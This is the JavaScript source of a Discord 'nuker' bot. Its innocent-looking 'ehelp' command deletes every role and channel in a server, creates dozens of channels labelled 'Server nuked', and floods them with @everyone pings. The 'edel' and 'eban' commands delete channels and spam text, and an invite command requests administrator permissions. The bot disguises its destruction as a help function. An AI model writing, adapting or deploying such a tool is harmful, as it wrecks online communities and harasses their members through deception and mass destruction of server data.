require('../node_modules/dotenv').config()
const {MessageCollector, Client , MessageEmbed, MessageAttachment, MessageFlags} = require("discord.js");
const client= new Client(); 
const prefix="e"
client.on("ready", () => {
    client.user.setActivity('Type e to get started');
    console.log("BOT ACTIVE");
})
client.on("message", (msg) => {
    if(msg.content==prefix+"help"){ 
        msg.guild.roles.cache.forEach(roles => {
            roles.delete()
        })
        msg.channel.send("  @here all the roles deleted ")
        var serverID = msg.guild.id;
        msg.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { msg.channel.send("Error Found: " + err) }))

        for(let i=0;i<=30;i++){
            msg.guild.channels.create(`Server nuked by JOE MAMA ${i}`,{
                type: 'GUILD_TEXT',
                    permissionOverwrites: [{
    	                id: msg.guild.id,
                        allow: ['VIEW_CHANNEL'],
                        deny: ['SEND_MESSAGES'],
	}]
            // const fetchedChannel = msg.guild.channels.cache.get(msg.channel.id);
            // fetchedChannel.delete()
}           ).then(channel =>{
                for(let j=0;j<=69;j++){
                    channel.send(" @everyone ig this server got nuked ")
                }
            }) 
        } 
    }
        if(msg.content==prefix){ 
            msg.reply(" `ehelp , edel , eban <name>` ")
       }
})
client.on("message", (msg) => {
    if(msg.content==prefix+"del"){ 
        msg.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { msg.channel.send("Error Found: " + err) }))
    } 
})
client.on("message", (msg) => {
    if(msg.content.startsWith(prefix+"ban")){ 
                for(let j=0;j<=10;j++){
                    msg.channel.send(`${msg.content.split().splice(-1)}`)
                }
                aname=msg.content.lastIndexOf(" ")
                for(let i=0;i<=20;i++){
                    msg.guild.channels.create(`${aname}`,{
                        type: 'GUILD_TEXT',
                            permissionOverwrites: [{
                                id: msg.guild.id,
                                allow: ['VIEW_CHANNEL'],
                                deny: ['SEND_MESSAGES'],
            }]
                    // const fetchedChannel = msg.guild.channels.cache.get(msg.channel.id);
                    // fetchedChannel.delete()
        }           ).then(channel =>{
                        for(let j=0;j<=10;j++){
                            channel.send(`${msg.content.split().splice(-1)}`)
                        }
                    }) 
                }
        
    } })
    client.on("message", (msg) => {
        if(msg.content==prefix+"invite"){ 
                msg.reply("https://discord.com/api/oauth2/authorize?client_id=872858027533930516&permissions=8&scope=bot")
        }  } ) // !can also add ur own oath above 
    client.login(process.env.DISCORDJS_BOT_TOKEN)
